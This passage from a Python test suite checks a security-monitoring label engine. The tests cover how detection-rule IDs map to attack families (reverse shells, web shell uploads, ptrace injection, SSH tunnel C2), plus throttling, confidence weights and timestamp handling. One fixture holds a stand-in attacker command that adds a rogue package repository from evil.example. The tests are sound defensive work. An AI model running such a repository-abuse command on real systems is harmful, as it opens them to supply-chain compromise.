            ("AUTH-004", "auth", "sudo_root_access", "privilege_escalation", "sudo_root_access", "bootstrap_rule_match_auth"),
            ("AUTH-005", "auth", "su_root_access", "privilege_escalation", "su_root_access", "bootstrap_rule_match_auth"),
            ("DB-001", "db", "db_auth_failure", "credential_access", "db_auth_failure", "bootstrap_rule_match_db"),
            ("WEB-004", "web", "web_shell_upload", "execution", "web_shell_upload", "bootstrap_rule_match_web"),
            ("PROC-003", "process", "service_shell_spawn", "execution", "service_shell_spawn", "bootstrap_rule_match_proc"),
            ("PROC-004", "process", "reverse_shell_execution", "command_and_control", "reverse_shell_exec", "bootstrap_rule_match_proc"),
            ("PROC-007", "process", "ptrace_process_injection", "defense_evasion", "ptrace_injection", "bootstrap_rule_match_proc"),
            ("PROC-C2-001", "process", "ssh_tunnel_command_and_control", "command_and_control", "ssh_tunnel_c2", "bootstrap_rule_match_proc_family"),
        ],
    )
    def test_strong_rule_canonical_mappings_remain_learnable(
        self, rule_id, category, behavior_label, attack_family, technique_label, reason
    ):
        from core.ml.label_engine import _bootstrap_rule_metadata

        canonical = _bootstrap_rule_metadata(rule_id, "attack", category)

        assert canonical["event_class"] == "attack"
        assert canonical["behavior_label"] == behavior_label
        assert canonical["attack_family"] == attack_family
        assert canonical["technique_label"] == technique_label
        assert canonical["model_usage_scope"] == "calibration_only"
        assert canonical["learnable"] is True
        assert canonical["label_reason"] == reason

    def test_thr_023_bootstrap_mapping_is_ml_dns_not_unmapped(self):
        from core.ml.label_engine import _bootstrap_rule_metadata

        canonical = _bootstrap_rule_metadata("THR-023", "attack", "network")

        assert canonical["event_class"] == "suspicious"
        assert canonical["behavior_label"] == "high_entropy_dns_burst"
        assert canonical["ml_family"] == "ML-DNS"
        assert canonical["label_family"] == "ML-DNS"
        assert canonical["model_usage_scope"] == "calibration_only"
        assert canonical["learnable"] is True
        assert canonical["poisoning_guard_passed"] is True
        assert canonical["label_reason"] == "bootstrap_rule_match_dns_burst"

    def test_web_005_bootstrap_mapping_is_consistent_and_learnable(self):
        from core.ml.label_engine import _bootstrap_rule_metadata

        canonical = _bootstrap_rule_metadata("WEB-005", "attack", "web")

        assert canonical["event_class"] == "suspicious"
        assert canonical["behavior_label"] == "web_discovery_probe"
        assert canonical["ml_family"] == "ML-WEBPOST"
        assert canonical["label_family"] == "ML-WEBPOST"
        assert canonical["model_usage_scope"] == "calibration_only"
        assert canonical["learnable"] is True
        assert canonical["label_reason"] == "bootstrap_rule_match_web_discovery"

    @pytest.mark.parametrize(
        "rule_id, expected_family",
        [
            ("SEQ-045", "exfiltration"),
            ("SEQ-054", "credential_access"),
            ("SEQ-055", "account_abuse"),
            ("SEQ-062", "command_and_control"),
            ("SEQ-069", "service_hijack"),
        ],
    )
    def test_strong_sequence_family_mapping_contract_stays_stable(self, rule_id, expected_family):
        from core.ml.label_engine import _map_attack_category

        assert _map_attack_category(rule_id, "sequence") == expected_family

    def test_auto_weight_is_stable(self):
        """The effective auto-labeled weight must remain unchanged."""
        from core.ml.label_engine import (
            LabelRecord, SOURCE_AUTO_LABELED
        )
        engine = self._make_engine()
        engine._auto_labeler._records = [
            LabelRecord(10.0, "normal", "system_service", SOURCE_AUTO_LABELED,
                        confidence=0.78, weight=0.78, ready_after=0.0,
                        event_class="benign", behavior_label="expected_auth_activity",
                        technique_label="auth_normal", source_trust="observed_benign_high",
                        learnable=True, model_usage_scope="calibration_only")
        ]
        data = engine.get_calibration_data()
        assert [weight for _, _, weight in data] == [0.78]

    @pytest.mark.parametrize("mode, expected_calls", [("auto", 1), ("disabled", 0)])
    def test_initialize_bootstrap_scan_mode_gate(self, mode, expected_calls):
        """Bootstrap historical scan should run only during startup in auto mode."""
        from core.ml.label_engine import LabelEngine

        engine = LabelEngine(
            distro_family="debian",
            labels_dir="data/labels",
            db=None,
            bootstrap_scan_mode=mode,
        )
        engine._synthetic_loader.load = lambda user_map=None: []

        scan_calls = []

        class _Scanner:
            def scan(self, detection_engine, normalizer):
                scan_calls.append((detection_engine, normalizer))
                return []

        engine._bootstrap_scanner = _Scanner()
        engine.initialize(detection_engine=object(), normalizer=object())

        assert len(scan_calls) == expected_calls

    def test_bootstrap_scanner_dry_run_reports_candidates_without_writes(self, tmp_path):
        """Bootstrap scanner dry-run should produce the file/env report and candidate counts."""
        from core.ml.label_engine import BootstrapLogScanner, validate_ml_label_metadata

        auth_log = tmp_path / "auth.log"
        auth_log.write_text("repeat-line\nrepeat-line\n", encoding="utf-8")

        scanner = BootstrapLogScanner(distro_family="debian", max_age_days=30, max_file_mb=500, max_total_mb=2048)
        scanner._configured_log_paths = lambda: [auth_log, tmp_path / "missing.log"]
        scanner._source_for_log_file = lambda path: "auth_log"
        scanner._infer_attack_category = lambda rule_id, event=None: "brute_force"
        scanner._infer_normal_category = lambda event: "auth_normal" if getattr(event, "kind", "") == "normal" else None

        class _Event:
            def __init__(self, kind, ts=2000000000.0):
                self.kind = kind
                self.ts = ts
                self.action = ""
                self.process = ""
                self.category = ""
                self.source = "auth_log"
                self.host = "test-host"
                self.user = "root"
                self.src_ip = ""
                self.dst_ip = ""
                self.outcome = "success"

        class _Normalizer:
            def __init__(self):
                self._events = iter([
                    _Event("attack", ts=2000000000.0),
                    _Event("attack", ts=0.0),
                ])

            def normalize(self, line, source):
                return next(self._events)

        class _Result:
            def __init__(self, rule_id):
                self.rule_id = rule_id
                self.score = 80.0

        class _RuleEngine:
            def __init__(self):
                self._results = iter([
                    [_Result("AUTH-001")],
                    [_Result("REGEX-004")],
                ])

            def check(self, event):
                return next(self._results, [])

        report = scanner.dry_run_report(
            detection_engine=type("Det", (), {"rule_engine": _RuleEngine()})(),
            normalizer=_Normalizer(),
        )

        assert report["scanned_files"] == 1
        assert report["candidate_attack"] == 2
        assert report["candidate_normal"] == 0
        assert report["scanned_bytes"] == auth_log.stat().st_size
        assert report["skipped_reason"]["file_missing"] == 1
        assert report["attack_category_counts"]["brute_force"] == 2
        assert report["normal_category_counts"] == {}
        assert report["bootstrap_job_id"].startswith("bootstrap_scan_debian_")
        assert len(report["candidates"]) == 2
        assert report["duplicate_summary"] == {
            "candidate_count": 2,
            "unique_line_hash_count": 1,
            "duplicate_candidate_count": 2,
        }

        learnable = report["candidates"][0]
        unmapped = report["candidates"][1]

        assert learnable["origin"] == "bootstrap_historical"
        assert learnable["timestamp_source"] == "log_event"
        assert learnable["timestamp_confidence"] == "high"
        assert learnable["poisoning_guard_passed"] is True
        assert learnable["no_action_contract"] is True
        assert learnable["duplicate_count"] == 2
        assert learnable["dedup_status"] == "duplicate_line_hash_observed"
        assert learnable["evidence_fields"]["origin"] == "bootstrap_historical"
        assert learnable["evidence_fields"]["timestamp_source"] == "log_event"
        assert learnable["evidence_fields"]["timestamp_confidence"] == "high"
        assert learnable["evidence_fields"]["poisoning_guard_passed"] is True
        assert learnable["evidence_fields"]["no_action_contract"] is True
        assert learnable["evidence_fields"]["duplicate_count"] == 2

        assert unmapped["event_class"] == "unknown_unlabeled"
        assert unmapped["behavior_label"] == "unknown_unlabeled"
        assert unmapped["ml_label"] == "unknown_unlabeled"
        assert unmapped["ml_family"] == "UNMAPPED_NONLEARNABLE"
        assert unmapped["label_family"] == "UNMAPPED_NONLEARNABLE"
        assert unmapped["learnable"] is False
        assert unmapped["model_usage_scope"] == "not_learnable"
        assert unmapped["timestamp_source"] == "scan_fallback"
        assert unmapped["timestamp_confidence"] == "low"
        assert unmapped["poisoning_guard_passed"] is False
        assert unmapped["duplicate_count"] == 2
        assert unmapped["evidence_fields"]["timestamp_quality_gate"] == "blocked_low_confidence"
        assert unmapped["evidence_fields"]["timestamp_source"] == "scan_fallback"
        assert unmapped["evidence_fields"]["timestamp_confidence"] == "low"
        assert unmapped["evidence_fields"]["poisoning_guard_passed"] is False
        assert validate_ml_label_metadata(unmapped)["valid"] is True

    def test_operator_label_accepted_no_db(self):
        """Operator labels should not raise exceptions when the DB is absent."""
        from core.ml.label_engine import LabelEngine, SOURCE_OPERATOR_LABEL
        engine = LabelEngine(distro_family="debian", db=None)
        try:
            engine.on_operator_label(score=85.0, label="attack", category="brute_force")
        except Exception as e:
            pytest.fail(f"Operator etiket exception fırlattı: {e}")
        assert len(engine._operator_records) == 1
        assert engine._operator_records[0].source == SOURCE_OPERATOR_LABEL
        assert engine._operator_records[0].weight == 2.0


class TestAutoLabelLoopProtection:
    """
    Döngü koruması testleri.
    1. ready_after bekleme süresi
    2. Entity throttle (24h max 3)
    3. Alarm koruması (alarmed entity'den normal etiket üretilmez)
    4. Delayed learning zorunluluğu
    """

    def test_auto_label_not_ready_before_age(self):
        """Auto labels must stay hidden from get_ready_records until ready_after elapses."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()

        alert = {"rule_id": "AUTH-003", "score": 85.0, "entity": "alice",
                 "ioc_match": False, "chain_id": None}
        record = labeler.process_alert(alert)
        assert record is not None

        # ready_after has not elapsed yet
        ready = labeler.get_ready_records()
        assert len(ready) == 0, "ready_after dolmadan etiket hazır sayılmamalı"

    def test_auto_label_ready_after_age_passes(self):
        """The label should become ready once ready_after passes."""
        from core.ml.label_engine import AutoLabeler, MIN_AUTO_LABEL_AGE
        import unittest.mock as mock

        labeler = AutoLabeler()
        alert = {"rule_id": "AUTH-003", "score": 85.0, "entity": "bob",
                 "ioc_match": True, "chain_id": None}

        with mock.patch("time.time", return_value=1000.0):
            labeler.process_alert(alert)

        # Move time forward
        with mock.patch("time.time", return_value=1000.0 + MIN_AUTO_LABEL_AGE + 1):
            ready = labeler.get_ready_records()
        assert len(ready) == 1, "ready_after geçince etiket hazır olmalı"

    def test_entity_throttle_blocks_excess(self):
        """Do not emit more than MAX_AUTO_PER_ENTITY_24H labels from the same entity within 24h."""
        from core.ml.label_engine import AutoLabeler, MAX_AUTO_PER_ENTITY_24H
        labeler = AutoLabeler()

        entity = "charlie"
        accepted = 0
        for i in range(MAX_AUTO_PER_ENTITY_24H + 2):
            alert = {"rule_id": "AUTH-003", "score": 85.0, "entity": entity,
                     "ioc_match": True, "chain_id": None}
            r = labeler.process_alert(alert)
            if r is not None:
                accepted += 1

        assert accepted == MAX_AUTO_PER_ENTITY_24H, \
            f"Max {MAX_AUTO_PER_ENTITY_24H} kabul edilmeli, {accepted} kabul edildi"

    def test_entity_normal_throttle_blocks_fourth_normal(self):
        """The 4th auto_normal should be blocked for the same entity."""
        from core.ml.label_engine import AutoLabeler, MAX_AUTO_PER_ENTITY_24H
        labeler = AutoLabeler()

        class FakeEvent:
            action = "service_heartbeat"
            process = "systemd"
            outcome = "success"
            user = "charlie-normal"
            src_ip = ""
            category = "service"
            message = "systemd heartbeat"
            fields = {}

        accepted = 0
        for _ in range(MAX_AUTO_PER_ENTITY_24H + 1):
            r = labeler.process_normal(FakeEvent(), delayed_learning_ok=True)
            if r is not None:
                accepted += 1

        assert accepted == MAX_AUTO_PER_ENTITY_24H

    def test_entity_attack_throttle_blocks_fourth_attack(self):
        """The 4th auto_attack should be blocked for the same entity."""
        from core.ml.label_engine import AutoLabeler, MAX_AUTO_PER_ENTITY_24H
        labeler = AutoLabeler()

        accepted = 0
        for _ in range(MAX_AUTO_PER_ENTITY_24H + 1):
            alert = {"rule_id": "AUTH-003", "score": 85.0, "entity": "charlie-attack",
                     "ioc_match": False, "chain_id": None}
            r = labeler.process_alert(alert)
            if r is not None:
                accepted += 1

        assert accepted == MAX_AUTO_PER_ENTITY_24H

    def test_normal_quota_full_does_not_block_attack_side(self):
        """Even when 3 auto_normal slots are full, the attack side should still work for the same entity."""
        from core.ml.label_engine import AutoLabeler, MAX_AUTO_PER_ENTITY_24H
        labeler = AutoLabeler()
        entity = "shared-entity-normal-full"

        class FakeEvent:
            action = "service_heartbeat"
            process = "systemd"
            outcome = "success"
            user = entity
            src_ip = ""
            category = "service"
            message = "systemd heartbeat"
            fields = {}

        for _ in range(MAX_AUTO_PER_ENTITY_24H):
            assert labeler.process_normal(FakeEvent(), delayed_learning_ok=True) is not None

        alert = {"rule_id": "AUTH-003", "score": 85.0, "entity": entity,
                 "ioc_match": False, "chain_id": None}
        assert labeler.process_alert(alert) is not None

    def test_attack_quota_full_does_not_block_normal_side(self):
        """Even when 3 auto_attack slots are full, the normal side should still work for the same entity."""
        from core.ml.label_engine import AutoLabeler, MAX_AUTO_PER_ENTITY_24H
        labeler = AutoLabeler()
        entity = "shared-entity-attack-full"

        for _ in range(MAX_AUTO_PER_ENTITY_24H):
            alert = {"rule_id": "AUTH-003", "score": 85.0, "entity": entity,
                     "ioc_match": False, "chain_id": None}
            assert labeler.process_alert(alert) is not None

        class FakeEvent:
            action = "service_heartbeat"
            process = "systemd"
            outcome = "success"
            user = entity
            src_ip = ""
            category = "service"
            message = "systemd heartbeat"
            fields = {}

        assert labeler.process_normal(FakeEvent(), delayed_learning_ok=True) is not None

    def test_auto_label_category_cap_limits_noisy_normal_network(self, monkeypatch):
        """Category caps should engage when the same normal_network category floods in."""
        import core.ml.label_engine as label_engine_mod
        from core.ml.label_engine import AutoLabeler

        monkeypatch.setattr(label_engine_mod, "AUTO_LABEL_CATEGORY_CAP", 3)
        labeler = AutoLabeler()

        accepted = 0
        for idx in range(4):
            event = type("Evt", (), {
                "action": "dns_query",
                "process": "systemd-resolved",
                "outcome": "success",
                "user": f"dns-user-{idx}",
                "src_ip": "",
                "category": "network",
                "message": "routine resolver query",
                "fields": {},
            })()
            if labeler.process_normal(event, delayed_learning_ok=True) is not None:
                accepted += 1

        assert accepted == 3

    def test_auth_normal_not_blocked_by_normal_network_category_cap(self, monkeypatch):
        """auth_normal should still work as a separate category even if the normal_network cap is full."""
        import core.ml.label_engine as label_engine_mod
        from core.ml.label_engine import AutoLabeler

        monkeypatch.setattr(label_engine_mod, "AUTO_LABEL_CATEGORY_CAP", 3)
        labeler = AutoLabeler()

        for idx in range(3):
            event = type("Evt", (), {
                "action": "dns_query",
                "process": "systemd-resolved",
                "outcome": "success",
                "user": f"dns-fill-{idx}",
                "src_ip": "",
                "category": "network",
                "message": "routine resolver query",
                "fields": {},
            })()
            assert labeler.process_normal(event, delayed_learning_ok=True) is not None

        auth_event = type("Evt", (), {
            "action": "ssh_login",
            "process": "sshd",
            "outcome": "success",
            "user": "auth-user",
            "src_ip": "",
            "category": "auth",
            "message": "Accepted password for auth-user",
            "fields": {},
        })()
        result = labeler.process_normal(auth_event, delayed_learning_ok=True)
        assert result is not None
        assert result.category == "auth_normal"

    def test_manual_labels_not_affected_by_auto_category_cap(self, monkeypatch):
        """Manual label'lar auto category cap'ten etkilenmemeli."""
        import core.ml.label_engine as label_engine_mod
        from core.ml.label_engine import LabelEngine

        monkeypatch.setattr(label_engine_mod, "AUTO_LABEL_CATEGORY_CAP", 1)
        engine = LabelEngine(distro_family="debian", db=None)

        event = type("Evt", (), {
            "action": "dns_query",
            "process": "systemd-resolved",
            "outcome": "success",
            "user": "dns-manual-test",
            "src_ip": "",
            "category": "network",
            "message": "routine resolver query",
            "fields": {},
        })()
        engine.on_normal_event(event, delayed_learning_ok=True)
        engine.on_operator_label(score=91.0, label="normal", category="normal_network", entity_key="operator")

        operator_records = [r for r in engine._operator_records if r.category == "normal_network"]
        assert len(operator_records) == 1
        assert operator_records[0].weight == 2.0

    def test_alarmed_entity_no_normal_label(self):
        """Do not generate auto-normal labels from an alarm-marked entity."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()

        entity = "dave"
        labeler.mark_alarm(entity)

        class FakeEvent:
            process = "cron"; outcome = "success"; user = entity; src_ip = ""
        result = labeler.process_normal(FakeEvent(), delayed_learning_ok=True)
        assert result is None, "Alarm işaretli entity'den normal etiket üretilmemeli"

    def test_no_delayed_learning_blocks_normal(self):
        """No normal label should be produced when delayed_learning_ok=False."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()

        class FakeEvent:
            process = "cron"; outcome = "success"; user = "eve"; src_ip = ""
        result = labeler.process_normal(FakeEvent(), delayed_learning_ok=False)
        assert result is None, "Delayed learning geçmeden normal etiket üretilmemeli"

    def test_delayed_learning_with_explicit_service_mapping_produces_normal(self):
        """delayed_learning_ok=True plus explicit service mapping should yield system_service."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()

        class FakeEvent:
            action = "service_heartbeat"
            process = "systemd"
            outcome = "success"
            user = "frank"
            src_ip = ""
            category = "service"
            message = "systemd heartbeat"
            fields = {}
        result = labeler.process_normal(FakeEvent(), delayed_learning_ok=True)
        assert result is not None, "Koşullar sağlandığında normal etiket üretilmeli"
        assert result.label == "normal"
        assert result.category == "system_service"
        assert result.source == "auto_labeled"
        assert result.weight == 0.78

    def test_generic_benign_event_without_explicit_mapping_blocked(self):
        """A benign event without an explicit match must not produce auto-normal."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()

        class FakeEvent:
            action = "process_exec"
            process = "cron"
            outcome = "success"
            user = "grace"
            src_ip = ""
            category = "process"
            message = "Routine process execution"
            fields = {}
        result = labeler.process_normal(FakeEvent(), delayed_learning_ok=True)
        assert result is None, "Açık eşleşme yoksa normal etiket üretilmemeli"

    def test_low_confidence_alert_rejected(self):
        """Alerts with score < 60 must not pass the confidence threshold."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()
        alert = {"rule_id": "AUTH-003", "score": 30.0, "entity": "heidi",
                 "ioc_match": False, "chain_id": None}
        result = labeler.process_alert(alert)
        assert result is None, "Düşük güven alarmı reddedilmeli"

    def test_source_is_auto_labeled(self):
        """The source value for auto labels should be 'auto_labeled'."""
        from core.ml.label_engine import AutoLabeler, SOURCE_AUTO_LABELED
        labeler = AutoLabeler()
        alert = {"rule_id": "AUTH-003", "score": 85.0, "entity": "ivan",
                 "ioc_match": True, "chain_id": None}
        record = labeler.process_alert(alert)
        assert record is not None
        assert record.source == SOURCE_AUTO_LABELED

    def test_confidence_maps_to_correct_weight(self):
        """ioc_match=True should yield confidence=0.95 and weight=0.95."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()
        alert = {"rule_id": "LOL-001", "score": 90.0, "entity": "judy",
                 "ioc_match": True, "chain_id": None}
        record = labeler.process_alert(alert)
        assert record is not None
        assert abs(record.confidence - 0.95) < 0.001
        assert abs(record.weight    - 0.95) < 0.001

    def test_score_90_maps_to_086_confidence(self):
        """A score-90 alert should yield confidence=0.86."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()
        alert = {"rule_id": "AUTH-003", "score": 90.0, "entity": "score90",
                 "ioc_match": False, "chain_id": None}
        record = labeler.process_alert(alert)
        assert record is not None
        assert abs(record.confidence - 0.86) < 0.001
        assert abs(record.weight - 0.86) < 0.001

    def test_score_80_maps_to_082_confidence(self):
        """A score-80 alert should yield confidence=0.82."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()
        alert = {"rule_id": "AUTH-003", "score": 80.0, "entity": "score80",
                 "ioc_match": False, "chain_id": None}
        record = labeler.process_alert(alert)
        assert record is not None
        assert abs(record.confidence - 0.82) < 0.001
        assert abs(record.weight - 0.82) < 0.001

    def test_score_70_maps_to_078_confidence(self):
        """A score-70 alert should yield confidence=0.78."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()
        alert = {"rule_id": "AUTH-003", "score": 70.0, "entity": "score70",
                 "ioc_match": False, "chain_id": None}
        record = labeler.process_alert(alert)
        assert record is not None
        assert abs(record.confidence - 0.78) < 0.001
        assert abs(record.weight - 0.78) < 0.001

    def test_score_60_maps_to_074_confidence(self):
        """A score-60 alert should yield confidence=0.74."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()
        alert = {"rule_id": "AUTH-003", "score": 60.0, "entity": "score60",
                 "ioc_match": False, "chain_id": None}
        record = labeler.process_alert(alert)
        assert record is not None
        assert abs(record.confidence - 0.74) < 0.001
        assert abs(record.weight - 0.74) < 0.001

    def test_score_59_has_no_auto_attack(self):
        """A score-59 alert must not produce auto-attack."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()
        alert = {"rule_id": "AUTH-003", "score": 59.0, "entity": "score59",
                 "ioc_match": False, "chain_id": None}
        record = labeler.process_alert(alert)
        assert record is None

    def test_benign_dns_query_produces_normal_network(self):
        """A benign dns_query success should produce normal_network."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()

        class FakeEvent:
            action = "dns_query"
            outcome = "success"
            user = "dns-user"
            src_ip = ""
            process = "systemd-resolved"
            category = "network"
            message = "Routine resolver query"
            fields = {}

        result = labeler.process_normal(FakeEvent(), delayed_learning_ok=True)
        assert result is not None
        assert result.category == "normal_network"

    def test_benign_package_update_produces_package_management(self):
        """A trusted package update should produce package_management."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()

        class FakeEvent:
            action = "pkg_update"
            outcome = "success"
            user = "pkg-user"
            src_ip = ""
            process = "apt"
            category = "package"
            message = "APT package metadata update completed"
            fields = {"pkg_action": "update"}

        result = labeler.process_normal(FakeEvent(), delayed_learning_ok=True)
        assert result is not None
        assert result.category == "package_management"

    def test_thr_023_auto_label_produces_ml_dns_contract_fields(self):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        event = type("Evt", (), {
            "ts": 1714444444.0,
            "action": "dns_query",
            "outcome": "success",
            "process": "named",
            "category": "network",
            "message": "High entropy dns burst detected",
            "fields": {},
            "distro_family": "debian",
        })()

        record = labeler.process_alert(
            {"rule_id": "THR-023", "score": 84.0, "entity": "dns-burst-1", "category": "network"},
            event=event,
        )

        assert record is not None
        assert record.ml_family == "ML-DNS"
        assert record.label_family == "ML-DNS"
        assert record.behavior_label == "high_entropy_dns_burst"
        assert record.event_class == "suspicious"
        assert record.model_usage_scope == "calibration_only"
        assert record.learnable is True
        assert record.no_action_contract is True
        assert record.evidence_fields["no_action_contract"] is True
        assert record.evidence_fields["timestamp_source"] == "event"
        assert record.evidence_fields["timestamp_confidence"] == "high"

    def test_web_005_live_auto_label_matches_registry_and_bootstrap_behavior(self):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        event = type("Evt", (), {
            "ts": 1714555555.0,
            "action": "http_request",
            "outcome": "failure",
            "process": "nginx",
            "category": "network",
            "message": "404 directory probe against admin path",
            "fields": {"status": 404},
            "distro_family": "debian",
        })()

        record = labeler.process_alert(
            {"rule_id": "WEB-005", "score": 90.0, "entity": "web-probe-1", "category": "network"},
            event=event,
        )

        assert record is not None
        assert record.category == "web_discovery"
        assert record.ml_family == "ML-WEBPOST"
        assert record.label_family == "ML-WEBPOST"
        assert record.behavior_label == "web_discovery_probe"
        assert record.event_class == "suspicious"
        assert record.no_action_contract is True
        assert record.evidence_fields["ml_family"] == "ML-WEBPOST"
        assert record.evidence_fields["timestamp_source"] == "event"
        assert record.evidence_fields["timestamp_confidence"] == "high"

    @pytest.mark.parametrize("rule_id", ["PKG-013", "PKG-014"])
    def test_pkg_repo_rules_bypass_benign_package_gate_but_keep_no_action_contract(self, rule_id):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        event = type("Evt", (), {
            "ts": 1714666666.0,
            "action": "process_exec" if rule_id == "PKG-013" else "sensitive_file_access",
            "outcome": "success",
            "process": "dnf" if rule_id == "PKG-013" else "auditd",
            "category": "process",
            "message": "dnf config-manager --add-repo https://evil.example/repo",
            "fields": {
                "cmdline": "dnf config-manager --add-repo https://evil.example/repo",
                "file_path": "/etc/yum.repos.d/evil.repo",
                "write_access": True,
            },
            "distro_family": "rhel",
        })()

        record = labeler.process_alert(
            {"rule_id": rule_id, "score": 84.0, "entity": f"{rule_id}-entity", "category": "process"},
            event=event,
        )

        assert record is not None
        assert record.ml_family == "ML-PROC"
        assert record.label_family == "ML-PROC"
        assert record.behavior_label == "package_repository_abuse"
        assert record.event_class == "suspicious"
        assert record.model_usage_scope == "calibration_only"
        assert record.learnable is True
        assert record.no_action_contract is True
        assert record.evidence_fields["no_action_contract"] is True
        assert record.evidence_fields["timestamp_source"] == "event"
        assert record.evidence_fields["timestamp_confidence"] == "high"

    @pytest.mark.parametrize(
        "process_name, message, fields",
        [
            ("dnf", "dnf check-update completed", {"cmdline": "dnf check-update"}),
            ("yum", "yum update completed", {"cmdline": "yum update -y"}),
            ("zypper", "zypper refresh completed", {"cmdline": "zypper refresh"}),
        ],
    )
    def test_benign_package_manager_actions_still_do_not_emit_auto_attack(self, process_name, message, fields):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        event = type("Evt", (), {
            "ts": 1714777777.0,
            "action": "pkg_update",
            "outcome": "success",
            "process": process_name,
            "category": "package",
            "message": message,
            "fields": fields,
            "distro_family": "rhel",
        })()

        record = labeler.process_alert(
            {"rule_id": "PKG-010", "score": 84.0, "entity": f"{process_name}-benign", "category": "process"},
            event=event,
        )

        assert record is None

    def test_dns_005_mapping_exists_but_live_auto_label_stays_below_threshold(self):
        from core.ml.label_engine import AutoLabeler, _bootstrap_rule_metadata

        canonical = _bootstrap_rule_metadata("DNS-005", "attack", "network")
        assert canonical["ml_family"] == "ML-DNS"
        assert canonical["label_family"] == "ML-DNS"

        labeler = AutoLabeler()
        event = type("Evt", (), {
            "ts": 1714888888.0,
            "action": "dns_query",
            "outcome": "success",
            "process": "dnsmasq",
            "category": "network",
            "message": "long suspicious dns query",
            "fields": {},
        })()
        record = labeler.process_alert(
            {"rule_id": "DNS-005", "score": 58.0, "entity": "dns005", "category": "network"},
            event=event,
        )
        assert record is None

    def test_live_auto_label_uses_event_timestamp_when_present(self):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        event = type("Evt", (), {
            "ts": 1711111111.25,
            "action": "ssh_login",
            "outcome": "failure",
            "process": "sshd",
            "category": "auth",
            "message": "Failed password",
            "fields": {},
        })()
        record = labeler.process_alert(
            {"rule_id": "AUTH-003", "score": 85.0, "entity": "event-ts-user", "category": "auth"},
            event=event,
        )

        assert record is not None
        assert record.ts == 1711111111.25
        assert record.evidence_fields["timestamp_source"] == "event"
        assert record.evidence_fields["timestamp_confidence"] == "high"

    def test_live_auto_label_falls_back_to_ingest_time_when_timestamp_missing(self):
        import unittest.mock as mock
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        event = type("Evt", (), {
            "action": "ssh_login",
            "outcome": "failure",
            "process": "sshd",
            "category": "auth",
            "message": "Failed password",
            "fields": {},
        })()
        with mock.patch("time.time", return_value=1712222222.5):
            record = labeler.process_alert(
                {"rule_id": "AUTH-003", "score": 85.0, "entity": "fallback-ts-user", "category": "auth"},
                event=event,
            )

        assert record is not None
        assert record.ts == 1712222222.5
        assert record.evidence_fields["timestamp_source"] == "ingest_fallback"
        assert record.evidence_fields["timestamp_confidence"] == "low"

    def test_live_auto_label_uses_risk_score_when_score_missing(self):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        event = type("Evt", (), {
            "ts": 1713333333.0,
            "action": "ssh_login",
            "outcome": "failure",
            "process": "sshd",
            "category": "auth",
            "message": "Failed password",
            "fields": {},
        })()

        record = labeler.process_alert(
            {"rule_id": "AUTH-002", "risk_score": 82.0, "entity": "risk-score-user", "category": "auth"},
            event=event,
        )

        assert record is not None
        assert record.score == 82.0
        assert record.ts == 1713333333.0
        assert record.event_class == "attack"
        assert record.behavior_label == "ssh_auth_failure"
        assert record.source_trust == "rule_high"
        assert record.model_usage_scope == "calibration_only"
        assert record.learnable is True
        assert record.label_reason == "bootstrap_rule_match_auth"
        assert record.ml_family == "ML-AUTH"
        assert record.label_family == "ML-AUTH"
        assert record.no_action_contract is True
        assert record.origin == "organic_live"
        assert record.evidence_fields["ml_family"] == "ML-AUTH"
        assert record.evidence_fields["label_family"] == "ML-AUTH"
        assert record.evidence_fields["no_action_contract"] is True
        assert record.evidence_fields["origin"] == "organic_live"
        assert record.evidence_fields["timestamp_source"] == "event"
        assert record.evidence_fields["timestamp_confidence"] == "high"

    def test_live_auto_label_uses_raw_score_when_score_and_risk_score_missing(self):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        record = labeler.process_alert(
            {"rule_id": "AUTH-003", "raw_score": 70.0, "entity": "raw-score-user", "category": "auth"},
            event=None,
        )

        assert record is not None
        assert record.score == 70.0
        assert abs(record.confidence - 0.78) < 0.001
        assert record.origin == "organic_live"
        assert record.evidence_fields["ml_family"] == "ML-AUTH"
        assert record.evidence_fields["label_family"] == "ML-AUTH"
        assert record.evidence_fields["no_action_contract"] is True
        assert record.evidence_fields["origin"] == "organic_live"

    def test_live_auto_label_missing_all_score_fields_stays_safe_none(self):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        record = labeler.process_alert(
            {"rule_id": "AUTH-003", "entity": "missing-score-user", "category": "auth"},
            event=None,
        )

        assert record is None

    def test_live_auto_label_non_numeric_score_does_not_crash_and_uses_fallback(self):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        record = labeler.process_alert(
            {
                "rule_id": "AUTH-003",
                "score": "not-a-number",
                "risk_score": 80.0,
                "entity": "fallback-score-user",
                "category": "auth",
            },
            event=None,
        )

        assert record is not None
        assert record.score == 80.0
        assert abs(record.confidence - 0.82) < 0.001

    def test_live_auto_label_low_risk_score_keeps_existing_none_behavior(self):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        record = labeler.process_alert(
            {"rule_id": "AUTH-002", "risk_score": 22.0, "entity": "low-risk-user", "category": "auth"},
            event=None,
        )

        assert record is None

    def test_suspicious_dns_query_has_no_normal_label(self):
        """A suspicious dns_query must not produce a normal label."""
        from core.ml.label_engine import AutoLabeler
        labeler = AutoLabeler()

        class FakeEvent:
            action = "dns_query"
            outcome = "success"
            user = "dns-user"
            src_ip = ""
